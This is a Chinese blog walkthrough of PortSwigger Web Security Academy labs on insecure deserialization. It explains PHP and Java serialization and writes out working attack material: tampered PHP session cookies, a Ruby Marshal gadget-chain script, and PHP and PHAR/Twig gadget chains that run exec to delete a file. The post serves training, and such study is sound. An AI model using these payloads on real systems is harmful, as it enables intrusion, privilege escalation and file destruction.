> 原文链接: https://www.anquanke.com//post/id/246276 


# 梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之高级漏洞篇 - 不安全的反序列化专题


                                阅读量   
                                **40257**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0164ec110fc09447f2.png)](https://p1.ssl.qhimg.com/t0164ec110fc09447f2.png)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 高级漏洞篇介绍

> 相对于服务器端漏洞篇和客户端漏洞篇，高级漏洞篇需要更深入的知识以及更复杂的利用手段，该篇也是梨子的全程学习记录，力求把漏洞原理及利用等讲的通俗易懂。

### <a class="reference-link" name="%E9%AB%98%E7%BA%A7%E6%BC%8F%E6%B4%9E%E7%AF%87%20-%20%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98"></a>高级漏洞篇 – 不安全的反序列化专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"></a>什么是序列化？

所谓序列化，就是将一些复杂的数据结构(如对象)转换成一种可以以序列字节流传输的更”扁平化”的格式的过程。序列化的数据可以更容易做到这些事
- 将复杂数据写入进程间内存、文件或数据库
- 在如网络、应用程序的不同组件之间或API调用中发送复杂数据
如果我们对一个对象进行序列化操作，它的所有状态都会被持久化保存，包括其属性和值。

### <a class="reference-link" name="%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"></a>序列化与反序列化？

反序列化就是序列化的逆向操作，即将序列化数据还原回原来的对象，并仍然具有序列化时的状态及属性、值。然后就可以继续对该对象进行后续操作。<br>
大部分的编程语言都默认支持序列化与反序列化操作。序列化数据有两种格式，分别为二进制与JSON字符串，不同的编程语言会将对象序列化成这两种格式的其中一种。序列化数据会包含被序列化对象的所有属性，如果想不对某些字段序列化，可以在类声明中标记其为transient。<br>
在不同的编程语言中，序列化操作也有不同的称呼，如Ruby的marshalling和python的pickling。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"></a>什么是不安全的反序列化？

不安全的反序列化就是攻击者通过某个数据可控点传入精心构造的序列化数据，然后被反序列化为对象后，攻击者操控该对象向应用程序传递恶意数据。而且很多时候在未完成反序列化过程之前就可能已经成功发动反序列化攻击，所以该漏洞危害是非常高的。

### <a class="reference-link" name="%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E7%9A%84%EF%BC%9F"></a>不安全的反序列化漏洞是如何产生的？

不安全的反序列化漏洞说白了，就是应用程序对序列化数据安全性的疏忽或过度自信。某些开发者觉得对序列化数据进行检查即可防护，但是这种检查往往需要首先对序列化数据执行反序列化操作后再进行检查，此时可能为时已晚。而且现在的应用程序都比较复杂，有非常多的依赖项，很难检查每个对象的调用。简而言之就是过于信任用户输入导致的。

### <a class="reference-link" name="PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"></a>PHP序列化格式

PHP序列化数据为JSON格式字符串。可读性非常高。其使用字符代表数据类型，数字代表该条目的长度。比如有这样一个对象User，它包含两个操作

```
$User-&gt;name = "carlos";
$User-&gt;isLoggedIn = true;
```

这个对象经过序列化后变成这样<br>`O:4:"User":2:`{`s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;`}``<br>
我们一点点来解读这条序列化数据
- O:4:”User” 表示有一个对象，对象名长度为4，名为User
- 2 表示这个对象有两个属性
- s:4:”name” 表示第一个属性名长度为4，名为name
- s:6:”carlos” 表示第一个属性为字符串类型，长度为6，值为carlos
- s:10:”isLoggedIn” 表示第二个属性名长度为10，名为isLoggedIn
- b:1 表示第二个属性为布尔类型，值为true(用1表示)
PHP序列化与反序列化操作分别对应serialize()和unserialize()函数，如果想要找到PHP反序列化漏洞点可以在可访问源码的情况下查找unserialize()函数。

### <a class="reference-link" name="Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"></a>Java序列化格式

与PHP不同的是，Java的序列化数据为二进制格式，可读性很低。不过还是有一些特征的，比如序列化的Java对象总是以十六进制下的ac和base64编码下的rO0开头。任何派生了java.io.Serializable接口的类都可以进行序列化与反序列化。如果可以访问到源码，还可以重点留意一下readObject()方法，因为它可以从InputStream读取和反序列化数据。

### <a class="reference-link" name="%E6%93%8D%E7%BA%B5%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"></a>操纵序列化的对象

### <a class="reference-link" name="%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"></a>修改对象属性

现在我们还是考虑有这样一个对象User，这个应用程序将序列化的User存放在Cookie中以识别用户。因为是放在Cookie中的，所以我们可以找到这样的JSON字符串。<br>`O:4:"User":2:`{`s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;`}``<br>
我们发现了一个很有趣的变量isAdmin，并且它还是布尔类型，所以我们猜测应用程序单纯根据这个参数识别当前用户是不是管理员。如果我们找到这样的代码，就能印证我们的猜测。

```
$user = unserialize($_COOKIE);
if ($user-&gt;isAdmin === true) `{`
// allow access to admin interface
`}`
```

如果我们将序列化字符串中的isAdmin的值改成1，再替换到Cookie中，经过这段代码反序列化操作后即会因为isAdmin的值为true识别当前用户为管理员。我们就可以因此执行所有管理员能执行的操作了。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1"></a>配套靶场：修改序列化对象

登录以后发现cookie中的session值很可疑，是被base64编码的，所以我们解码一下看看

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ead1b8a0a9fcc4ec.png)

好家伙，序列化的字符串，我们像上面一样，将admin的值改为1，然后重新base64编码后替换session的值

[![](https://p5.ssl.qhimg.com/t01f5a4cb486b22bf2c.png)](https://p5.ssl.qhimg.com/t01f5a4cb486b22bf2c.png)

成功拥有管理员权限，就可以删除指定用户了

[![](https://p5.ssl.qhimg.com/t013eba24b09444389e.png)](https://p5.ssl.qhimg.com/t013eba24b09444389e.png)

### <a class="reference-link" name="%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"></a>修改数据类型

上面是讲的修改序列化数据中的属性，也可能因为异常的数据类型导致反序列化攻击。像PHP这种语言就存在这种情况，就是使用弱类型比较符(==)时。如果这个比较符的操作数为字符串和数字，会导致其将字符串转换为数字，那如果将数字5与字符串5做比较即会返回true了。而且更为神奇的是，如果是以数字开头的字符串，也会因为这个比较符把字符串转换为这个数字再进行比较。所以当5与5 of something比较也会因为这个特性返回true。那么如果让0与纯字符串比较呢？<br>`0 == "Example string" // true`<br>
也会返回true，很神奇。这就是如果字符串不以数字开头就被认为是0。那么利用这个特性就可以在下列代码中触发逻辑漏洞。

```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) `{`
// log in successfully
`}`
```

根据刚才讲的特性，如果Cookie中的密码为纯字符串，我们只需要输入0就能登录成功。这里值得注意的是，在修改序列化数据时，还要及时更新各条目的长度，否则也不会攻击成功的。<br>
上面讲的都是序列化数据为JSON字符串的情况，如果是二进制数据，burp推荐使用插件Hackvertor，它可以根据序列化数据自动更新二进制偏移。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"></a>配套靶场：修改序列化的数据类型

登录以后，像往常一样将session解码，然后将username改成administrator，更新一下长度，再将access_token修改为类型为i，值为0

[![](https://p2.ssl.qhimg.com/t0135edef7309e1a328.png)](https://p2.ssl.qhimg.com/t0135edef7309e1a328.png)

成功通过上面见到的特性绕过了身份验证登陆了管理员账号，其实这里有第二种解法，我们可以修改username，然后看看会发生什么

[![](https://p3.ssl.qhimg.com/t019772fa1416ca47fb.png)](https://p3.ssl.qhimg.com/t019772fa1416ca47fb.png)

从报错信息来看，应用程序会直接将当前用户的access_token反馈在里面，我们将其替换一下也是可以成功登录管理员账号的

[![](https://p3.ssl.qhimg.com/t01abde9cf1309dfb02.png)](https://p3.ssl.qhimg.com/t01abde9cf1309dfb02.png)

成功登录管理员以后，就可以删除指定用户了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018b2c4a25bd22d587.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%8A%9F%E8%83%BD%E7%82%B9"></a>使用应用程序中的功能点

有的时候，应用程序中的某些功能点也可以用来发动反序列化攻击。比如应用程序有个功能点，删除用户，它会在删除用户同时删除对象User中image_location属性指定的用户头像图片路径。但是如果我们能够修改该对象中的这个属性值为其他文件路径，就会在删除该用户的同时删除我们指定的文件，而不是什么用户头像图片。这种攻击手段是需要手动调用该功能点的，后面小节我们会介绍仅需要传入构造的序列化数据即会自动利用的魔术方法。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%8A%9F%E8%83%BD%E7%82%B9%E5%8F%91%E5%8A%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>配套靶场：使用应用程序中的功能点发动不安全的反序列化

我们首先找到一个删除功能点，这里切记要通过拦截的方式重放，不能发到repeater中，因为只有一次删除的机会，拦截到包以后将session解码后中的图片路径修改成指定的文件路径

[![](https://p4.ssl.qhimg.com/t0128e3a739d2db85d7.png)](https://p4.ssl.qhimg.com/t0128e3a739d2db85d7.png)

然后重新编码，放包，成功删除用户的同时删除了指定文件

[![](https://p0.ssl.qhimg.com/t010c48df28d817274c.png)](https://p0.ssl.qhimg.com/t010c48df28d817274c.png)

### <a class="reference-link" name="%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"></a>魔术方法

魔术方法就是在某些情况下会自动调用的方法。支持面向对象的编程语言中基本都会有魔术方法。魔术方法函数名一般会以两条下划线(__)开头。比如PHP中的__construct()，它会在类实例化的时候自动调用，相当于python中的__init__。因为在实例化的时候就会自动执行，所以如果攻击者重写该函数则会在实例化的时候自动执行其他代码。而在反序列化操作时也会自动调用魔术方法，比如PHP中unserialize()函数会自动调用__wakeup() 魔术方法。在Java中也是，存在ObjectInputStream.readObject()方法，可以从原始字节流中读取数据。并且可序列化的对象还可以声明自己的readObject()方法，例如

```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException `{`...`}`;
```

攻击者可以利用魔术方法在反序列化完成之前就将恶意数据传递到应用程序中。所以魔术方法是发动更高级攻击的起点。

### <a class="reference-link" name="%E6%B3%A8%E5%85%A5%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1"></a>注入任意对象

前面我们讲过通过简单修改序列化数据的方式进行攻击。但是如果我们在反序列化点注入精心构造的序列化数据，在被反序列化后则可以执行非预期的功能。并且一般应用程序是不会检查正在反序列化的数据的，所以我们注入的序列化数据也会被成功实例化为对象。如果我们可以访问到源码，我们可以通过研究其中的类的细节利用魔术方法发动攻击。下面我们通过一道靶场来深入理解。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9APHP%E4%B8%AD%E7%9A%84%E6%B3%A8%E5%85%A5%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1"></a>配套靶场：PHP中的注入任意对象

登录以后，我们看到sitemap中有一个可疑的文件/libs/CustomTemplate.php，但是我们通过repeater无法直接访问，所以我们试着加一个临时文件符(~)看看能不能访问到其副本。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01419dd977c348e2c0.png)

我们看到里面存在两个魔术方法
- __construct($template_file_path)
- __destruct()
通过代码的简单审计发现，在对象销毁时会删除lock**file_path指定的文件路径，所以我们要构造这样的序列化对象**

**[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014693e4c14cba7173.png)**

**因为\**_destruct()会在对象销毁时自动调用，所以我们只需要设置对象的lock_file_path属性值即可。将base64编码后的数据替换到session中即可成功删除指定文件。

[![](https://p1.ssl.qhimg.com/t01d7f31254a78e9a70.png)](https://p1.ssl.qhimg.com/t01d7f31254a78e9a70.png)

### <a class="reference-link" name="%E5%B7%A5%E5%85%B7%E9%93%BE"></a>工具链

前面讲到的都是通过单个魔术方法成功执行制定操作的。但是如果应用程序非常复杂，则需要让用户输入经过一系列的魔术方法调用链条才能利用成功。burp称之为gadget chains(工具链)。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E9%A2%84%E7%BD%AE%E5%B7%A5%E5%85%B7%E9%93%BE%E5%8F%91%E5%8A%A8"></a>利用预置工具链发动

正常情况下我们想要自己构造工具链是很困难的，因为我们很难访问到全部源码。但是我们可以直接利用前人发现的预置的工具链发动攻击。比如Java的Apache Commons Collections库中的工具链可以在一个网站上被利用，那么使用该库的任何其他网站也可以使用相同的链来利用。

**<a class="reference-link" name="ysoserial"></a>ysoserial**

这是一款基于Java的反序列化预置工具链利用工具，你只需要选择你要使用的工具链，然后填写你想要执行的命令，它会自动构造对应的序列化对象。<br>
ysoserial提供的工具链也不全都是可以执行任意代码的，也可能用于其他操作，比如
- URLDNS链就是可以向指定的URL发出DNS请求，通常可以用来检测是否存在反序列化漏洞点。
- JRMPClient链也可以用于检测。它可以用于与指定的IP进行TCP连接。在DNS流量都被限制的情况下可以使用这种检测方法。让它分别尝试与本地地址与防火墙地址连接，如果响应时间存在差异说明存在反序列化漏洞。
下面我们通过一道靶场来深入理解这个工具的使用

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8Apache%20Commons%E9%93%BE%E5%8F%91%E5%8A%A8Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>配套靶场：使用Apache Commons链发动Java反序列化**

首先我们利用ysoserial生成payload

[![](https://p0.ssl.qhimg.com/t010c0b69680e902413.png)](https://p0.ssl.qhimg.com/t010c0b69680e902413.png)

从上图是看得出这个工具是非常方便的，然后我们将payload替换到cookie中即可成功发动反序列化攻击

[![](https://p1.ssl.qhimg.com/t01ce7e4b9bd1063e0b.png)](https://p1.ssl.qhimg.com/t01ce7e4b9bd1063e0b.png)

<a class="reference-link" name="PHP%E9%80%9A%E7%94%A8%E5%B7%A5%E5%85%B7%E9%93%BE"></a>**PHP通用工具链**

这里burp介绍了一款基于PHP的通用工具链利用工具：”PHP Generic Gadget Chains” (PHPGGC)。

**<a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E9%A2%84%E7%BD%AE%E5%B7%A5%E5%85%B7%E9%93%BE%E5%8F%91%E5%8A%A8PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>配套靶场：利用预置工具链发动PHP反序列化**

登录用户，然后解码session字段发现是由两部分构成的，一部分是称为token字段的序列化字符串，一部分是称为sig_hmac_sha1的hash值，于是我们尝试故意修改cookie触发报错，这样可能会暴露使用的框架信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a1c9cb778ffeec4a.png)

从报错信息中得知使用的是Symfony 4.3.6这一款php框架，然后我们发现burp中的sitemap中有phpinfo页面，发到repeater中发现可以看到文件内容，于是直接在浏览器访问更方便查看，发现其中泄漏了网站的SECRET_KEY

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d6f131428f5dbbb3.png)

然后我们利用PHPGGC构造对象

[![](https://p5.ssl.qhimg.com/t01a2f44270a8cc26c7.png)](https://p5.ssl.qhimg.com/t01a2f44270a8cc26c7.png)

然后再用签名函数结合对象和刚才获取的SECRET_KEY生成正确的签名

[![](https://p2.ssl.qhimg.com/t0184a9bed2d2862bac.png)](https://p2.ssl.qhimg.com/t0184a9bed2d2862bac.png)

将对象和签名替换到cookie中，整体做URL编码后重放包，成功发动反序列化攻击

[![](https://p3.ssl.qhimg.com/t017b27c37935c2cedc.png)](https://p3.ssl.qhimg.com/t017b27c37935c2cedc.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E6%9C%89%E8%AE%B0%E5%BD%95%E7%9A%84%E5%B7%A5%E5%85%B7%E9%93%BE"></a>使用有记录的工具链

有的工具链虽然没有现成的工具，但是有记录该工具链的构造过程的文章，也是可以用来发动序列化攻击的。当然，也可以将其制作成工具自己使用。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%9C%89%E8%AE%B0%E5%BD%95%E7%9A%84%E5%B7%A5%E5%85%B7%E9%93%BE%E5%8F%91%E5%8A%A8Ruby%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>配套靶场：使用有记录的工具链发动Ruby反序列化

因为Ruby没有现成的利用工具，所以我们需要在搜索引擎上搜索一下是否有记录的工具链，然后找到这样的脚本

```
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1&gt;&amp;2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file &lt;=&gt; other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each`{``}` rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

对于这段代码，我们只需要将id替换成我们想要执行的命令，然后运行这个脚本即可生成payload

[![](https://p4.ssl.qhimg.com/t016028cd6aa751901b.png)](https://p4.ssl.qhimg.com/t016028cd6aa751901b.png)

然后我们就可以将生成的payload替换到session中发动反序列化攻击从而删除指定文件了。

[![](https://p4.ssl.qhimg.com/t01b674714b953448f9.png)](https://p4.ssl.qhimg.com/t01b674714b953448f9.png)

### <a class="reference-link" name="%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E5%B7%A5%E5%85%B7%E9%93%BE"></a>自己构造工具链

当既没有现成的利用工具，也没有查到相关工具链的文章时，就需要自己构造工具链了。这就需要我们获得部分或全部的源码，并对其中的调用关系进行推演，直到构造出可以利用的工具链。值得注意的是，如果是像Java那种二进制序列化数据，想要构造序列化对象就需要使用目标编程语言自行编写生成序列化对象的代码。下面我们通过两道靶场来学习如何自己构造工具链。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E6%9E%84%E9%80%A0%E8%87%AA%E5%AE%9A%E4%B9%89Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E9%93%BE"></a>配套靶场1：构造自定义Java反序列化工具链

首先我们在sitemap中找到了泄漏的一个备份文件

[![](https://p2.ssl.qhimg.com/t01da28f61602cf300e.png)](https://p2.ssl.qhimg.com/t01da28f61602cf300e.png)

但是并没有发现什么有用的东西，我们看看backup文件夹中还有没有别的东西

[![](https://p4.ssl.qhimg.com/t010d1d55b46ff0c479.png)](https://p4.ssl.qhimg.com/t010d1d55b46ff0c479.png)

发现还有一个文件，我们看看里面都有什么

[![](https://p1.ssl.qhimg.com/t01c24759832979f7a4.png)](https://p1.ssl.qhimg.com/t01c24759832979f7a4.png)

发现了很多有用的信息，比如使用的是postgre数据库，然后还有sql语句模板。从代码中我们能看出是通过对象中的属性id拼接sql语句的，所以我们需要构造一个id值为sql注入payload的对象，这里burp提供了一个用来生成序列化对象的代码，可以在在线编译网站repl.it中运行。我们只需要在Main.java中替换your-payload-here的值即可，因为我们已经得知是postgre数据库，所以我们直接利用相关payload生成序列化对象

[![](https://p1.ssl.qhimg.com/t010234abd4ddd9bc78.png)](https://p1.ssl.qhimg.com/t010234abd4ddd9bc78.png)

然后将其替换到session中即可发动，可以在报错响应中看到administrator的密码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01efff4ad25e363e9e.png)

得到administrator的密码后就能登录它然后删除指定用户了

[![](https://p0.ssl.qhimg.com/t019ffdc2f66ad07c9f.png)](https://p0.ssl.qhimg.com/t019ffdc2f66ad07c9f.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E6%9E%84%E9%80%A0%E8%87%AA%E5%AE%9A%E4%B9%89PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E9%93%BE"></a>配套靶场2：构造自定义PHP反序列化工具链

同样的，我们通过sitemap还原一下可疑文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018d31c9c88fc4c9d0.png)

从源码来看，如果我们想构造exec(rm /home/carlos/morale.txt)需要构造一条工具链，下面我们慢慢地来分析，首先我们关注一下这段代码

```
private function build_product() `{`
        $this-&gt;product = new Product($this-&gt;default_desc_type, $this-&gt;desc);
    `}`
```

这是CustomTemplate类的build_product()方法，它会new一个Product对象，下面我们再看一下Product类

```
class Product `{`
    public $desc;

    public function __construct($default_desc_type, $desc) `{`
        $this-&gt;desc = $desc-&gt;$default_desc_type;
    `}`
`}`
```

我们看到Product类中有个在实例化会自动调用的魔术方法__construct，在实例化的时候可以指定两个参数：default_desc_type和desc，并且会将default_desc_type传递给desc调用。很明显，default_desc_type值应该是”rm /home/carlos/morale.txt”，那么desc就得是exec函数，但是我们不能直接将其值设置为”exec”，是没有效果的。我们再来看DefaultMap类

```
class DefaultMap `{`
    private $callback;

    public function __construct($callback) `{`
        $this-&gt;callback = $callback;
    `}`

    public function __get($name) `{`
        return call_user_func($this-&gt;callback, $name);
    `}`
`}`
```

里面有两个魔术方法，我们重点关注__get这个魔术方法，它会调用该对象的callback属性值指定的函数，这就是我们想要的，所以desc的值应该是一个含有值为”exec”属性callback的DefaultMap实例化对象。于是我们这样构造序列化payload<br>`O:14:"CustomTemplate":2:`{`s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:`{`s:8:"callback";s:4:"exec";`}``}``<br>
替换到session以后就会触发我们构造的工具链，从而执行删除指定文件的命令了。

[![](https://p5.ssl.qhimg.com/t015741d43195ca277e.png)](https://p5.ssl.qhimg.com/t015741d43195ca277e.png)

### <a class="reference-link" name="PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>PHAR反序列化

这是一种特定于PHP的反序列化攻击。PHP有一个伪协议phar:\/\/，用于处理PHP存档文件(.phar)。这类文件包含序列化的元数据，所以phar:\/\/在处理这类文件的时候会默认执行反序列化操作，就可能会触发反序列化攻击。我们可以通过各种方式将.phar文件上传到phar:\/\/功能点，如扩展名绕过等。下面我们通过一道靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8PHAR%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B7%A5%E5%85%B7%E9%93%BE"></a>配套靶场：使用PHAR反序列化利用自定义工具链

登录，发现应用程序通过/cgi-bin/avatar.php?avatar=wiener访问用户的头像

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014073b0327964b251.png)

尝试访问这个文件发现提示文件不存在，那我们尝试访问一下上级目录

[![](https://p2.ssl.qhimg.com/t012c3b032588ffa864.png)](https://p2.ssl.qhimg.com/t012c3b032588ffa864.png)

然后我们访问CustomTemplate.php~和blog.php~

[![](https://p3.ssl.qhimg.com/t0151535e878f4630ae.png)](https://p3.ssl.qhimg.com/t0151535e878f4630ae.png)

[![](https://p1.ssl.qhimg.com/t01c8017e9714dd0295.png)](https://p1.ssl.qhimg.com/t01c8017e9714dd0295.png)

我们发现CustomTemplate.php中file_exists可以用来对phar文件反序列化，所以我们需要将构造好的对象传递给它，然后继续分析发现本质就是传递给template_file_path属性，我们需要在Blog.php构造exec(rm /home/carlos/morale.txt)，发现使用了twig模板引擎，所以可以发动SSTI，这个后面的专题才会讲到，这里暂时不讲。至此我们可以构造这样的工具链

```
class CustomTemplate `{``}`
class Blog `{``}`
$object = new CustomTemplate;
$blog = new Blog;
$blog-&gt;desc = '`{``{`_self.env.registerUndefinedFilterCallback("exec")`}``}``{``{`_self.env.getFilter("rm /home/carlos/morale.txt")`}``}`';
$blog-&gt;user = 'user';
$object-&gt;template_file_path = $blog;
```

然后我们将上面payload制作成phar文件，这里可以搜到相关的脚本(如phar jpg polyglot)，这里可以直接使用burp制作好的，上传成用户的头像，在读取头像接口处使用phar:\/\/伪协议读取该头像即可成功发动序列化攻击，删除指定文件

[![](https://p1.ssl.qhimg.com/t01d1c64e2e3961038f.png)](https://p1.ssl.qhimg.com/t01d1c64e2e3961038f.png)

